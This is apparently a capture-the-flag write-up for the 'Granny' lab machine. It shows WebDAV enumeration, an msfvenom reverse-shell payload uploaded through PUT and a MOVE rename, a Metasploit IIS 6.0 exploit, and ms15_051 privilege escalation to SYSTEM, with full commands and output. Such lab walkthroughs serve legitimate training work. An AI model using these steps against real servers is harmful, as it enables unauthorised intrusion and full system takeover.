## Granny

__Machine IP: 10.10.10.15__
Difficulty: Easy

## Scanning

### Nmap Scanning

```bash
$ nmap -sC -sV  -oA granny.nmap 10.10.10.15                                                     1 ⚙
Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-20 16:09 EDT
Nmap scan report for 10.10.10.15
Host is up (0.096s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|   Server Type: Microsoft-IIS/6.0
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|_  Server Date: Fri, 20 Aug 2021 20:12:50 GMT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.66 seconds
```

## Enumeration

- Running `gobuster` yeilded no useful information
- Running `davtest` shows  the following output

```javascript
$ davtest --url http://10.10.10.15
********************************************************
 Testing DAV connection
OPEN		SUCCEED:		http://10.10.10.15
********************************************************
NOTE	Random string for this session: 1wo8aCKL
********************************************************
 Creating directory
MKCOL		SUCCEED:		Created http://10.10.10.15/DavTestDir_1wo8aCKL
********************************************************
 Sending test files
PUT	cfm	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.cfm
PUT	txt	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.txt
PUT	jsp	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.jsp
PUT	shtml	FAIL
PUT	html	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.html
PUT	cgi	FAIL
PUT	aspx	FAIL
PUT	php	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.php
PUT	pl	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.pl
PUT	asp	FAIL
PUT	jhtml	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.jhtml
********************************************************
 Checking for test file execution
EXEC	cfm	FAIL
EXEC	txt	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.txt
EXEC	jsp	FAIL
EXEC	html	SUCCEED:	http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.html
EXEC	php	FAIL
EXEC	pl	FAIL
EXEC	jhtml	FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_1wo8aCKL
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.cfm
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.txt
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.jsp
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.html
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.php
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.pl
PUT File: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.jhtml
Executes: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.txt
Executes: http://10.10.10.15/DavTestDir_1wo8aCKL/davtest_1wo8aCKL.html
```

- Checking those `SUCCESS` files, found that we can place file on server.

- Now create a reverse shell with `aspx` and paste that into a file and `SUBMIT` the request through burp.
- To capture the `davtest` request, set the `burp` to listen on port 80 and capture the requests.

- Sample captured request

```javascript
PUT /DavTestDir_6ULOtW/davtest_6ULOtW.html HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: 127.0.0.1:80
User-Agent: DAV.pm/v0.49
Content-Length: 26

HTML put via davtest<br />
```

- create my own sample file

![put_request](images/put_request.PNG)



-  generate a reverse shell payload using `msfvenom`

```bash
$: msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx
```

- setting up the listener using metasploit

```bash
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp

msf6 exploit(multi/handler) > set lhost tun2


msf6 exploit(multi/handler) > set lport 4444

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.5:4444
```
- Now copy the payload generated from msfvenom and send it as aspx file, but that unfortunately rersulted as `403 forbidden`, but we have another method that can be used in place of `PUT`, that is `MOVE`.

- Usage

```html
MOVE /pub2/folder1/ HTTP/1.1
Destination: http://www.contoso.com/pub2/folder2/
Host: www.contoso.com
```

- First request

```html
PUT /shashi.html HTTP/1.1
TE: deflate,gzip;q=0.3
Connection: close
Host: 10.10.10.15:80
User-Agent: DAV.pm/v0.49
Content-Length: 2916

# msfvenom payload here
```
- Then use `MOVE` to move the file to different location with `aspx` extension

```html
MOVE /shashi.html HTTP/1.1
Destination: /shashi.aspx
TE: deflate,gzip;q=0.3
Connection: close
Host: 10.10.10.15:80
User-Agent: DAV.pm/v0.49
Content-Length: 2916

# No payload this time
```

- On requesting the page, `metasploit` should create a reverse connection.

- Even though connections has been established, its being disconnected, and then i found metasploit module and ran

```bash
msf6 >  use exploit/windows/iis/iis_webdav_scstoragepathfromurl
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options

Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   MAXPATHLENGTH  60               yes       End of physical path brute force
   MINPATHLENGTH  3                yes       Start of physical path brute force
   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          80               yes       The target port (TCP)
   SSL            false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI      /                yes       Path of IIS 6 web application
   VHOST                           no        HTTP server virtual host


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Microsoft Windows Server 2003 R2 SP2 x86


msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set rhosts  10.10.10.15
rhosts => 10.10.10.15
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set lhost 10.10.14.5
lhost => 10.10.14.5
msf6 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > run


[*] Started reverse TCP handler on 10.10.14.5:4444 
[*] Trying path length 3 to 60 ...
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.10.10.15:1046) at 2021-08-20 18:21:58 -0400

meterpreter >
```

- on running `local_exploit_suggester` found following
```bash
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 37 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed

```

- trying suggested `vulnerable` exploit(s)

```bash
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms15_051_client_copy_image
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms15_051_client_copy_image) > show options

Module options (exploit/windows/local/ms15_051_client_copy_image):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.37.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf6 exploit(windows/local/ms15_051_client_copy_image) > set session 1
session => 1
```

- migrate to `NT_Authority Process`
```bash
msf6 exploit(windows/local/ms15_051_client_copy_image) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]                                                
 4     0     System                                                          
 272   4     smss.exe                                                        
 324   272   csrss.exe                                                       
 348   272   winlogon.exe                                                    
 396   348   services.exe                                                    
 408   348   lsass.exe                                                       
 612   396   svchost.exe                                                     
 680   1088  cidaemon.exe                                                    
 684   396   svchost.exe                                                     
 740   396   svchost.exe                                                     
 768   396   svchost.exe                                                     
 804   396   svchost.exe                                                     
 828   1088  cidaemon.exe                                                    
 940   396   spoolsv.exe                                                     
 968   396   msdtc.exe                                                       
 1088  396   cisvc.exe                                                       
 1136  396   svchost.exe                                                     
 1184  396   inetinfo.exe                                                    
 1220  396   svchost.exe                                                     
 1264  1088  cidaemon.exe                                                    
 1332  396   VGAuthService.exe                                               
 1412  396   vmtoolsd.exe                                                    
 1460  396   svchost.exe                                                     
 1632  396   alg.exe                                                         
 1664  396   svchost.exe                                                     
 1776  612   wmiprvse.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\wbem\wmiprvse.exe
 1912  396   dllhost.exe                                                     
 2308  612   wmiprvse.exe                                                    
 2620  348   logon.scr                                                       
 2744  1460  w3wp.exe           x86   0        NT AUTHORITY\NETWORK SERVICE  c:\windows\system32\inetsrv\w3wp.exe
 2816  612   davcdata.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\inetsrv\davcdata.exe
 2864  2744  rundll32.exe       x86   0                                      C:\WINDOWS\system32\rundll32.exe
 3440  2864  cmd.exe            x86   0        NT AUTHORITY\NETWORK SERVICE  C:\WINDOWS\system32\cmd.exe

meterpreter > migrate 2816
[*] Migrating from 2864 to 2816...
[*] Migration completed successfully
```
- then run the exploit

```bash
msf6 exploit(windows/local/ms15_051_client_copy_image) > exploit

[*] Started reverse TCP handler on 10.10.14.7:5555 
[*] Launching notepad to host the exploit...
[+] Process 3252 launched.
[*] Reflectively injecting the exploit DLL into 3252...
[*] Injecting exploit into 3252...
[*] Exploit injected. Injecting payload into 3252...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175174 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.7:5555 -> 10.10.10.15:1032) at 2021-08-28 08:29:42 -0400


meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

```

